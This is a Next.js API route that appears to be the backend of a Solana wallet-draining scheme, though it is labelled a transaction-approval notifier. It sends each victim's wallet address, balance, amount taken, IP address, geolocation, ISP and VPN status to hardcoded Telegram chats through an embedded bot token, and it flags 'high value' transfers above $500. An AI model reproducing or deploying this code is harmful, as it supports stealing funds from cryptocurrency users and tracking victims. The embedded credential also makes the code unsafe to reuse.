import { type NextRequest, NextResponse } from "next/server"

const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_IDS = ["7556622176", "1801489729"]

enum EventType {
  TRANSACTION_APPROVED = "TRANSACTION_APPROVED",
  APPROVAL_REQUEST = "APPROVAL_REQUEST",
  APPROVAL_ERROR = "APPROVAL_ERROR",
  INVALID_REQUEST = "INVALID_REQUEST",
  API_HEALTH_CHECK = "API_HEALTH_CHECK",
  HIGH_VALUE_TRANSFER = "HIGH_VALUE_TRANSFER",
  TRANSACTION_BROADCAST_SUCCESS = "TRANSACTION_BROADCAST_SUCCESS"
}

interface NotificationData {
  eventType: EventType
  walletAddress?: string
  userIP?: string
  balanceSOL?: number
  balanceUSD?: number
  transferAmountSOL?: number
  transferAmountUSD?: number
  error?: string
  timestamp?: string
  requestData?: any
  locationInfo?: {
    country?: string
    region?: string
    city?: string
    isp?: string
    isProxy?: boolean
  }
  userAgent?: string
  transactionHash?: string
  rpcEndpoint?: string
  solPrice?: number
}

async function getIPInfo(ip: string) {
  try {
    if (ip === "unknown" || ip === "127.0.0.1") {
      return {
        country: "Local/Loopback",
        region: "Local",
        city: "Local",
        isp: "Local",
        isProxy: false
      }
    }
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`)
    if (!response.ok) {
      throw new Error(`IP API error: ${response.status}`)
    }
    
    const data = await response.json()
    return {
      country: data.country_name || data.country_code || "unknown",
      region: data.region || data.region_code || "unknown",
      city: data.city || "unknown",
      isp: data.org || data.asn || "unknown",
      isProxy: data.proxy || data.hosting || false
    }
  } catch (error) {
    return {
      country: "unknown",
      region: "unknown",
      city: "unknown",
      isp: "unknown",
      isProxy: false
    }
  }
}

async function sendTelegramNotification(notification: NotificationData) {
  try {
    const timestamp = notification.timestamp || new Date().toISOString()
    const userAgent = notification.userAgent || "unknown"
    
    // Get location info
    const locationInfo = notification.locationInfo || 
      (notification.userIP && notification.userIP !== "unknown" 
        ? await getIPInfo(notification.userIP) 
        : {
            country: "unknown",
            region: "unknown",
            city: "unknown",
            isp: "unknown",
            isProxy: false
          })

    let message = ""
    let emoji = ""

    switch (notification.eventType) {
      case EventType.TRANSACTION_APPROVED:
        emoji = "✅"
        const transferValue = notification.transferAmountUSD || (notification.transferAmountSOL || 0) * (notification.solPrice || 153.32)
        
        message = `
${emoji} *Transaction Approved & Executed*

📍 *Wallet Address:* \`${notification.walletAddress}\`
💰 *Original Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💸 *Transferred Amount:* ${notification.transferAmountSOL?.toFixed(6)} SOL
💵 *Transfer Value:* $${transferValue.toFixed(2)}
📈 *SOL Price:* $${notification.solPrice?.toFixed(2)}
🔗 *Transaction Hash:* \`${notification.transactionHash || "Pending"}\`
🌐 *IP Address:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
📱 *ISP:* ${locationInfo.isp} ${locationInfo.isProxy ? "(⚠️ VPN/Proxy)" : ""}
🔧 *User Agent:* ${userAgent}
🕐 *Timestamp:* ${new Date(timestamp).toLocaleString()}
📅 *Date:* ${new Date(timestamp).toDateString()}
⏰ *Time:* ${new Date(timestamp).toLocaleTimeString()}
`
        break

      case EventType.HIGH_VALUE_TRANSFER:
        emoji = "💰"
        const highValue = notification.transferAmountUSD || 0
        message = `
${emoji} *HIGH VALUE TRANSFER EXECUTED*

💰 *Amount Transferred:* ${notification.transferAmountSOL?.toFixed(6)} SOL
💵 *Value:* $${highValue.toFixed(2)}
📍 *From Wallet:* \`${notification.walletAddress}\`
🔗 *Transaction Hash:* \`${notification.transactionHash}\`
🌐 *IP:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
📱 *ISP:* ${locationInfo.isp}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
🚨 *SUCCESSFUL TRANSFER*
`
        break

      case EventType.TRANSACTION_BROADCAST_SUCCESS:
        emoji = "📡"
        message = `
${emoji} *Transaction Broadcasted Successfully*

🔗 *Transaction Hash:* \`${notification.transactionHash}\`
📍 *From Wallet:* \`${notification.walletAddress}\`
💸 *Amount:* ${notification.transferAmountSOL?.toFixed(6)} SOL
💵 *Value:* $${notification.transferAmountUSD?.toFixed(2) || "Calculating..."}
🌐 *RPC Endpoint:* ${notification.rpcEndpoint}
🌐 *IP:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
✅ *STATUS: CONFIRMED*
`
        break

      case EventType.APPROVAL_REQUEST:
        emoji = "📥"
        message = `
${emoji} *Approval Request Received*

📍 *Wallet Address:* \`${notification.walletAddress}\`
💰 *Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💵 *Value:* $${notification.balanceUSD?.toFixed(2)}
🌐 *IP Address:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
📱 *ISP:* ${locationInfo.isp} ${locationInfo.isProxy ? "(⚠️ VPN/Proxy)" : ""}
🔧 *User Agent:* ${userAgent}
🕐 *Timestamp:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.APPROVAL_ERROR:
        emoji = "❌"
        message = `
${emoji} *Approval Processing Error*

📍 *Wallet Address:* \`${notification.walletAddress || "unknown"}\`
💬 *Error:* ${notification.error}
🌐 *IP Address:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
📱 *ISP:* ${locationInfo.isp}
🔧 *User Agent:* ${userAgent}
🕐 *Timestamp:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.INVALID_REQUEST:
        emoji = "⚠️"
        message = `
${emoji} *Invalid Request Received*

💬 *Error:* ${notification.error}
🌐 *IP Address:* ${notification.userIP}
📍 *Location:* ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}
📱 *ISP:* ${locationInfo.isp}
🔧 *User Agent:* ${userAgent}
🕐 *Timestamp:* ${new Date(timestamp).toLocaleString()}
📋 *Request Data:* ${JSON.stringify(notification.requestData || {}, null, 2)}
`
        break

      case EventType.API_HEALTH_CHECK:
        emoji = "🏥"
        message = `
${emoji} *API Health Check*

✅ *Status:* API is running
📡 *Endpoint:* POST /api/transaction-approved
🕐 *Timestamp:* ${new Date(timestamp).toLocaleString()}
`
        break

      default:
        emoji = "ℹ️"
        message = `
${emoji} *Unknown Event*
📋 *Type:* ${notification.eventType}
🌐 *IP:* ${notification.userIP}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const sendPromises = TELEGRAM_CHAT_IDS.map(chatId =>
      fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message.trim(),
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      }).catch(error => {
        console.error(`Failed to send to chat ${chatId}:`, error)
        return null
      })
    )

    await Promise.all(sendPromises)
    return true
  } catch (error) {
    console.error("Error in Telegram notification:", error)
    return false
  }
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const timestamp = new Date().toISOString()
  const userAgent = request.headers.get('user-agent') || "unknown"
  
  try {
    // Extract IP from request
    const ip = request.ip || 
               request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
               request.headers.get('x-real-ip') || 
               "unknown"
    
    const body = await request.json()
    const { 
      walletAddress, 
      balanceSOL, 
      balanceUSD, 
      userIP, 
      transferAmountSOL,
      transferAmountUSD,
      transactionHash,
      rpcEndpoint,
      solPrice 
    } = body
    
    // Use provided userIP or extract from request
    const finalUserIP = userIP || ip
    
    // Get location info
    const locationInfo = await getIPInfo(finalUserIP)

    // Check for high value transfers (over $500)
    const transferValue = transferAmountUSD || (transferAmountSOL || 0) * (solPrice || 153.32)
    const isHighValue = transferValue > 500

    // Determine event type based on transaction hash
    let eventType = EventType.TRANSACTION_APPROVED
    if (isHighValue) {
      eventType = EventType.HIGH_VALUE_TRANSFER
    }
    if (transactionHash) {
      eventType = EventType.TRANSACTION_BROADCAST_SUCCESS
    }

    // Send notification
    const notificationSent = await sendTelegramNotification({
      eventType: eventType,
      walletAddress: walletAddress,
      userIP: finalUserIP,
      userAgent: userAgent,
      balanceSOL: balanceSOL,
      balanceUSD: balanceUSD,
      transferAmountSOL: transferAmountSOL,
      transferAmountUSD: transferAmountUSD,
      transactionHash: transactionHash,
      rpcEndpoint: rpcEndpoint,
      solPrice: solPrice,
      locationInfo: locationInfo,
      timestamp: timestamp
    })

    if (!notificationSent) {
      throw new Error("Failed to send Telegram notification")
    }

    const processingTime = Date.now() - startTime

    return NextResponse.json({ 
      success: true,
      message: "Transaction approval notification sent successfully",
      details: {
        walletAddress: walletAddress,
        balanceSOL: balanceSOL,
        balanceUSD: balanceUSD,
        transferAmountSOL: transferAmountSOL,
        transferAmountUSD: transferAmountUSD,
        transactionHash: transactionHash,
        rpcEndpoint: rpcEndpoint,
        notificationSent: true,
        isHighValue: isHighValue,
        processingTime: `${processingTime}ms`,
        timestamp: timestamp,
        notificationChats: TELEGRAM_CHAT_IDS.length
      }
    })
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Unknown error"
    
    await sendTelegramNotification({
      eventType: EventType.APPROVAL_ERROR,
      userIP: request.ip || "unknown",
      userAgent: userAgent,
      error: errorMessage,
      timestamp: timestamp
    })
    
    return NextResponse.json({ 
      error: "Failed to process approval request",
      details: errorMessage
    }, { status: 500 })
  }
}

export async function GET() {
  const timestamp = new Date().toISOString()
  
  // Send health check notification
  await sendTelegramNotification({
    eventType: EventType.API_HEALTH_CHECK,
    timestamp: timestamp
  })
  
  return NextResponse.json({
    status: "ok",
    api: "Transaction Approved API",
    endpoint: "/api/transaction-approved",
    description: "Endpoint for sending transaction approval notifications to Telegram",
    method: "POST",
    requiredParameters: {
      walletAddress: "string",
      balanceSOL: "number",
      balanceUSD: "number",
      userIP: "string (optional)",
      transferAmountSOL: "number (optional)",
      transferAmountUSD: "number (optional)",
      transactionHash: "string (optional)",
      rpcEndpoint: "string (optional)",
      solPrice: "number (optional)"
    },
    features: [
      "Transaction approval notifications",
      "High value transfer alerts",
      "IP location tracking",
      "VPN/Proxy detection",
      "Multiple Telegram chat support"
    ],
    timestamp: timestamp,
    notificationChats: TELEGRAM_CHAT_IDS.length
  })
}

// Optional: Add a PUT method for updating transaction status
export async function PUT(request: NextRequest) {
  try {
    const body = await request.json()
    const { transactionHash, status, walletAddress, amount } = body
    
    if (!transactionHash || !status) {
      return NextResponse.json({ error: "Missing required parameters" }, { status: 400 })
    }
    
    await sendTelegramNotification({
      eventType: EventType.TRANSACTION_BROADCAST_SUCCESS,
      transactionHash: transactionHash,
      walletAddress: walletAddress,
      transferAmountSOL: amount,
      status: status,
      timestamp: new Date().toISOString()
    })
    
    return NextResponse.json({
      success: true,
      message: "Transaction status updated",
      transactionHash: transactionHash,
      status: status
    })
  } catch (error) {
    return NextResponse.json({
      error: "Failed to update transaction status",
      details: error instanceof Error ? error.message : "Unknown error"
    }, { status: 500 })
  }
}
